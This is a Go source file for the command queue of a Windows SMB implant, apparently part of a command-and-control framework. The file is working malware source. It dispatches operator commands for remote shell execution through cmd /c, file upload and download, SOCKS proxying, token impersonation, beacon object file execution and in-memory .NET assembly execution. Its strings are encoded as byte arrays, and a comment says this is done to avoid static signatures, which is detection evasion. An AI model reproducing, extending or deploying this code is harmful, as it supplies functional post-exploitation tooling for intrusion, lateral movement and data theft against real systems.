// server/docker/payloads/SMB_Windows/command_queue.go
// Command queue for SMB agent - core infrastructure only, handlers in action_*.go files

//go:build windows
// +build windows

package main

import (
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"
	"time"
	"unicode"
)

// Command queue strings (constructed to avoid static signatures)
// Note: inline-assembly and bof commands are dispatched by numeric CommandType ID,
// so those string constants have been removed (dead code).
var (
	// Used by parseDownloadCommand/parseUploadCommand
	cqCmdUpload   = string([]byte{0x75, 0x70, 0x6c, 0x6f, 0x61, 0x64})   // upload
	cqCmdDownload = string([]byte{0x64, 0x6f, 0x77, 0x6e, 0x6c, 0x6f, 0x61, 0x64}) // download

	// Used by executeShellCommand fallback
	cqWordWindows = string([]byte{0x77, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73}) // windows
	cqShellCmd    = string([]byte{0x63, 0x6d, 0x64})                         // cmd
	cqShellCmdArg = string([]byte{0x2f, 0x63})                               // /c
	cqShellSh     = string([]byte{0x73, 0x68})                               // sh
	cqShellShArg  = string([]byte{0x2d, 0x63})                               // -c
)

// CommandQueue manages the processing of commands
type CommandQueue struct {
	mu              sync.Mutex
	commands        []Command
	cmdHandlers     map[int]CommandHandler          // New: numeric ID dispatch
	cmdRegistry     map[string]CommandInterface     // Deprecated: kept for compatibility
	cmdContext      *CommandContext
	activeDownloads map[string]*DownloadInfo
	activeUploads   map[string]*UploadInfo
	activeJobs      map[string]JobInfo
}

// NewCommandQueue creates a new command queue instance
func NewCommandQueue() *CommandQueue {
	currentDir, err := os.Getwd()
	if err != nil {
		currentDir = "."
	}

	ctx := &CommandContext{
		WorkingDir: currentDir,
		SessionEnv: make(map[string]string),
	}

	queue := &CommandQueue{
		commands:        make([]Command, 0, 10),
		cmdHandlers:     make(map[int]CommandHandler, 40),     // Numeric ID handlers
		cmdRegistry:     make(map[string]CommandInterface, 40), // Deprecated: kept for compatibility
		cmdContext:      ctx,
		activeDownloads: make(map[string]*DownloadInfo, 4),
		activeUploads:   make(map[string]*UploadInfo, 4),
		activeJobs:      make(map[string]JobInfo, 8),
	}

	// Register all commands using numeric IDs
	// Cross-platform commands (SMB_Windows subset)
	queue.RegisterHandler(CmdCd, wrapCommand(&CdCommand{}))
	queue.RegisterHandler(CmdLs, wrapCommand(&LsCommand{}))
	queue.RegisterHandler(CmdPwd, wrapCommand(&PwdCommand{}))
	queue.RegisterHandler(CmdDownload, wrapCommand(&DownloadCommand{}))
	queue.RegisterHandler(CmdUpload, wrapCommand(&UploadCommand{}))
	queue.RegisterHandler(CmdShell, wrapCommand(&ShellCommand{}))
	queue.RegisterHandler(CmdSocks, wrapCommand(&SocksCommand{}))
	queue.RegisterHandler(CmdJobkill, wrapCommand(&JobKillCommand{}))
	queue.RegisterHandler(CmdExit, wrapCommand(&ExitCommand{}))
	queue.RegisterHandler(CmdSleep, wrapCommand(&SleepCommand{}))
	queue.RegisterHandler(CmdEnv, wrapCommand(&EnvCommand{}))
	queue.RegisterHandler(CmdCat, wrapCommand(&CatCommand{}))
	queue.RegisterHandler(CmdHash, wrapCommand(&HashCommand{}))
	queue.RegisterHandler(CmdHashDir, wrapCommand(&HashDirCommand{}))
	queue.RegisterHandler(CmdPs, wrapCommand(&PSCommand{}))
	queue.RegisterHandler(CmdRm, wrapCommand(&RmCommand{}))
	queue.RegisterHandler(CmdWhoami, wrapCommand(&WhoamiCommand{}))

	// Windows specific commands
	queue.RegisterHandler(CmdToken, wrapCommand(&TokenCommand{}))
	queue.RegisterHandler(CmdRev2self, wrapCommand(&Rev2SelfCommand{}))
	queue.RegisterHandler(CmdBof, wrapCommand(&BOFCommand{}))
	queue.RegisterHandler(CmdBofAsync, wrapCommand(&BOFAsyncCommand{}))
	queue.RegisterHandler(CmdBofJobs, wrapCommand(&BOFJobsCommand{}))
	queue.RegisterHandler(CmdBofOutput, wrapCommand(&BOFOutputCommand{}))
	queue.RegisterHandler(CmdBofKill, wrapCommand(&BOFKillCommand{}))
	queue.RegisterHandler(CmdInlineAssembly, wrapCommand(&InlineAssemblyCommand{}))
	queue.RegisterHandler(CmdInlineAssemblyAsync, wrapCommand(&InlineAssemblyAsyncCommand{}))
	queue.RegisterHandler(CmdInlineAssemblyJobs, wrapCommand(&InlineAssemblyJobsCommand{}))
	queue.RegisterHandler(CmdInlineAssemblyOutput, wrapCommand(&InlineAssemblyOutputCommand{}))
	queue.RegisterHandler(CmdInlineAssemblyKill, wrapCommand(&InlineAssemblyKillCommand{}))
	queue.RegisterHandler(CmdInlineAssemblyJobsClean, wrapCommand(&InlineAssemblyJobsCleanCommand{}))
	queue.RegisterHandler(CmdInlineAssemblyJobsStats, wrapCommand(&InlineAssemblyJobsStatsCommand{}))

	// SMB Link commands
	queue.RegisterHandler(CmdLink, wrapCommand(&LinkCommand{}))
	queue.RegisterHandler(CmdUnlink, wrapCommand(&UnlinkCommand{}))
	queue.RegisterHandler(CmdLinks, wrapCommand(&LinksCommand{}))

	return queue
}

// RegisterHandler registers a command handler by numeric ID
func (cq *CommandQueue) RegisterHandler(id int, handler CommandHandler) {
	cq.cmdHandlers[id] = handler
}

// wrapCommand converts a CommandInterface to a CommandHandler function
func wrapCommand(cmd CommandInterface) CommandHandler {
	return func(ctx *CommandContext, args []string) CommandResult {
		return cmd.Execute(ctx, args)
	}
}

// AddCommands parses and adds commands to the queue
func (cq *CommandQueue) AddCommands(jsonData string) error {
	var commands []Command
	if err := json.Unmarshal([]byte(jsonData), &commands); err != nil {
		return fmt.Errorf(Err(E18))
	}

	cq.mu.Lock()
	defer cq.mu.Unlock()

	cq.commands = append(cq.commands, commands...)
	return nil
}

// ProcessNextCommand processes the next command in the queue
func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
	cq.mu.Lock()
	if len(cq.commands) == 0 {
		cq.mu.Unlock()
		return nil, nil
	}

	cmd := cq.commands[0]
	cq.commands = cq.commands[1:]
	cq.mu.Unlock()

	// Set the current command in context
	cq.cmdContext.mu.Lock()
	cq.cmdContext.CurrentCommand = &cmd
	cq.cmdContext.mu.Unlock()

	// Apply session environment variables
	cq.applySessionEnvironment()

	// Handle inline-assembly job management commands FIRST (by numeric ID)
	if cmd.CommandType == CmdInlineAssemblyJobs {
		if handler, exists := cq.cmdHandlers[CmdInlineAssemblyJobs]; exists {
			result := handler(cq.cmdContext, []string{})
			result.Command = cmd
			result.CompletedAt = time.Now().Format(time.RFC3339)
			return &result, nil
		} else {
			return &CommandResult{
				Command:     cmd,
				ErrorString: Err(E19),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}, nil
		}
	}

	// Handle inline-assembly-jobs-clean command
	if cmd.CommandType == CmdInlineAssemblyJobsClean {
		parts := strings.Fields(cmd.Command)
		if handler, exists := cq.cmdHandlers[CmdInlineAssemblyJobsClean]; exists {
			args := []string{}
			if len(parts) > 1 {
				args = parts[1:]
			}
			result := handler(cq.cmdContext, args)
			result.Command = cmd
			result.CompletedAt = time.Now().Format(time.RFC3339)
			return &result, nil
		}
	}

	// Handle inline-assembly-jobs-stats command
	if cmd.CommandType == CmdInlineAssemblyJobsStats {
		if handler, exists := cq.cmdHandlers[CmdInlineAssemblyJobsStats]; exists {
			result := handler(cq.cmdContext, []string{})
			result.Command = cmd
			result.CompletedAt = time.Now().Format(time.RFC3339)
			return &result, nil
		}
	}

	// Handle inline-assembly-output command WITH arguments
	if cmd.CommandType == CmdInlineAssemblyOutput {
		parts := strings.Fields(cmd.Command)
		if handler, exists := cq.cmdHandlers[CmdInlineAssemblyOutput]; exists {
			args := []string{}
			if len(parts) > 1 {
				args = parts[1:]
			}
			result := handler(cq.cmdContext, args)
			result.Command = cmd
			result.CompletedAt = time.Now().Format(time.RFC3339)
			return &result, nil
		}
	}

	// Handle inline-assembly-kill command WITH arguments
	if cmd.CommandType == CmdInlineAssemblyKill {
		parts := strings.Fields(cmd.Command)
		if handler, exists := cq.cmdHandlers[CmdInlineAssemblyKill]; exists {
			args := []string{}
			if len(parts) > 1 {
				args = parts[1:]
			}
			result := handler(cq.cmdContext, args)
			result.Command = cmd
			result.CompletedAt = time.Now().Format(time.RFC3339)
			return &result, nil
		}
	}

	// Handle inline-assembly commands WITH data (actual assembly execution)
	if (cmd.CommandType == CmdInlineAssembly || cmd.CommandType == CmdInlineAssemblyAsync) && cmd.Data != "" {
		var testParse map[string]interface{}
		_ = json.Unmarshal([]byte(cmd.Data), &testParse)

		handlerID := cmd.CommandType
		if handler, exists := cq.cmdHandlers[handlerID]; exists {
			result := handler(cq.cmdContext, []string{})
			result.Command = cmd
			result.CompletedAt = time.Now().Format(time.RFC3339)
			return &result, nil
		} else {
			return &CommandResult{
				Command:     cmd,
				ErrorString: Err(E19),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}, nil
		}
	}

	// Handle upload chunks
	if cmd.CommandType == CmdUpload && cmd.Data != "" {
		result, err := HandleUploadChunk(cmd, cq.cmdContext)
		if err != nil {
			return &CommandResult{
				Command:     cmd,
				Error:       err,
				ErrorString: err.Error(),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}, nil
		}
		return result, nil
	}

	// Handle async BOF commands WITH data
	if cmd.CommandType == CmdBofAsync && cmd.Data != "" {
		result := cq.processBOFAsync(cmd)
		return &result, nil
	}

	// Handle regular BOF commands WITH data
	if cmd.CommandType == CmdBof && cmd.Data != "" {
		result := cq.processBOF(cmd)
		return &result, nil
	}

	// Handle download continuation
	if cmd.Filename != "" && cmd.CurrentChunk > 0 {
		cq.mu.Lock()
		downloadInfo, exists := cq.activeDownloads[cmd.Filename]
		cq.mu.Unlock()

		if !exists {
			return &CommandResult{
				Command:     cmd,
				Error:       fmt.Errorf(Err(E4)),
				ErrorString: Err(E4),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}, nil
		}

		if !downloadInfo.InProgress {
			return &CommandResult{
				Command:     cmd,
				Error:       fmt.Errorf(Err(E4)),
				ErrorString: Err(E4),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}, nil
		}

		result, err := GetNextFileChunk(downloadInfo.FilePath, cmd.CurrentChunk, cmd)
		if err != nil {
			return &CommandResult{
				Command:     cmd,
				Error:       err,
				ErrorString: err.Error(),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}, nil
		}

		cq.UpdateDownloadProgress(cmd.Filename, cmd.CurrentChunk)
		return result, nil
	}

	// Parse command
	var args []string
	cmdLower := strings.ToLower(strings.TrimSpace(cmd.Command))

	if strings.HasPrefix(cmdLower, cqCmdDownload) {
		args = parseDownloadCommand(cmd.Command)
	} else if strings.HasPrefix(cmdLower, cqCmdUpload) {
		args = parseUploadCommand(cmd.Command)
	} else {
		args = parseCommandLine(cmd.Command)
	}

	if len(args) == 0 {
		return &CommandResult{
			Command:     cmd,
			Error:       fmt.Errorf(Err(E1)),
			ErrorString: Err(E1),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}, nil
	}

	cmdArgs := args[1:]

	// Look up command handler by numeric ID
	if handler, exists := cq.cmdHandlers[cmd.CommandType]; exists {
		result := handler(cq.cmdContext, cmdArgs)

		// For file operations, preserve data from handler
		if (cmd.CommandType == CmdDownload || cmd.CommandType == CmdUpload) &&
			(result.Command.Filename != "" || result.Command.Data != "") {
			result.Command.CommandID = cmd.CommandID
			result.Command.CommandDBID = cmd.CommandDBID
			result.Command.AgentID = cmd.AgentID
			result.Command.Timestamp = cmd.Timestamp
		} else {
			result.Command = cmd
		}

		result.CompletedAt = time.Now().Format(time.RFC3339)
		return &result, nil
	}

	// If no handler found, try to execute as shell command
	output, err := executeShellCommand(cmd.Command)
	if err != nil {
		return &CommandResult{
			Command:     cmd,
			Output:      output,
			Error:       err,
			ErrorString: err.Error(),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}, nil
	}

	return &CommandResult{
		Command:     cmd,
		Output:      output,
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}, nil
}

// Helper function to apply session environment before executing any command
func (cq *CommandQueue) applySessionEnvironment() {
	cq.cmdContext.mu.RLock()
	if len(cq.cmdContext.SessionEnv) == 0 {
		cq.cmdContext.mu.RUnlock()
		return
	}
	defer cq.cmdContext.mu.RUnlock()

	for key, value := range cq.cmdContext.SessionEnv {
		os.Setenv(key, value)
	}
}

// executeShellCommand executes a command through the system shell
func executeShellCommand(command string) (string, error) {
	var cmd *exec.Cmd

	if runtime.GOOS == cqWordWindows {
		cmd = exec.Command(cqShellCmd, cqShellCmdArg, command)
	} else {
		cmd = exec.Command(cqShellSh, cqShellShArg, command)
	}

	output, err := cmd.CombinedOutput()
	return string(output), err
}

// parseCommandLine properly handles quoted arguments and spaces in paths
func parseCommandLine(cmdLine string) []string {
	args := make([]string, 0, 8)
	var current strings.Builder
	current.Grow(64)
	var inQuote rune
	var escaped bool

	for _, r := range cmdLine {
		if escaped {
			current.WriteRune(r)
			escaped = false
			continue
		}

		if r == '\\' {
			if inQuote != 0 {
				escaped = true
				continue
			}
			current.WriteRune(r)
			continue
		}

		if inQuote != 0 {
			if r == inQuote {
				inQuote = 0
			} else {
				current.WriteRune(r)
			}
			continue
		}

		if r == '"' || r == '\'' {
			inQuote = r
			continue
		}

		if unicode.IsSpace(r) {
			if current.Len() > 0 {
				args = append(args, current.String())
				current.Reset()
			}
			continue
		}

		current.WriteRune(r)
	}

	if current.Len() > 0 {
		args = append(args, current.String())
	}

	return args
}

// parseDownloadCommand specifically handles the download command
func parseDownloadCommand(cmdLine string) []string {
	cmdLine = strings.TrimSpace(cmdLine)

	if !strings.HasPrefix(strings.ToLower(cmdLine), cqCmdDownload) {
		return parseCommandLine(cmdLine)
	}

	if len(cmdLine) <= 8 {
		return []string{cqCmdDownload}
	}

	if cmdLine[8] != ' ' && cmdLine[8] != '\t' {
		return parseCommandLine(cmdLine)
	}

	remainder := strings.TrimSpace(cmdLine[8:])

	if remainder == "" {
		return []string{cqCmdDownload}
	}

	if (strings.HasPrefix(remainder, "\"") && strings.HasSuffix(remainder, "\"")) ||
		(strings.HasPrefix(remainder, "'") && strings.HasSuffix(remainder, "'")) {
		remainder = remainder[1 : len(remainder)-1]
	}

	return []string{cqCmdDownload, remainder}
}

// parseUploadCommand specifically handles the upload command
func parseUploadCommand(cmdLine string) []string {
	cmdLine = strings.TrimSpace(cmdLine)

	if !strings.HasPrefix(strings.ToLower(cmdLine), cqCmdUpload) {
		return parseCommandLine(cmdLine)
	}

	if len(cmdLine) <= 6 {
		return []string{cqCmdUpload}
	}

	if cmdLine[6] != ' ' && cmdLine[6] != '\t' {
		return parseCommandLine(cmdLine)
	}

	remainder := strings.TrimSpace(cmdLine[6:])

	if remainder == "" {
		return []string{cqCmdUpload}
	}

	if (strings.HasPrefix(remainder, "\"") && strings.HasSuffix(remainder, "\"")) ||
		(strings.HasPrefix(remainder, "'") && strings.HasSuffix(remainder, "'")) {
		remainder = remainder[1 : len(remainder)-1]
	}

	return []string{cqCmdUpload, remainder}
}

// Download/Upload tracking methods are in job_manager.go
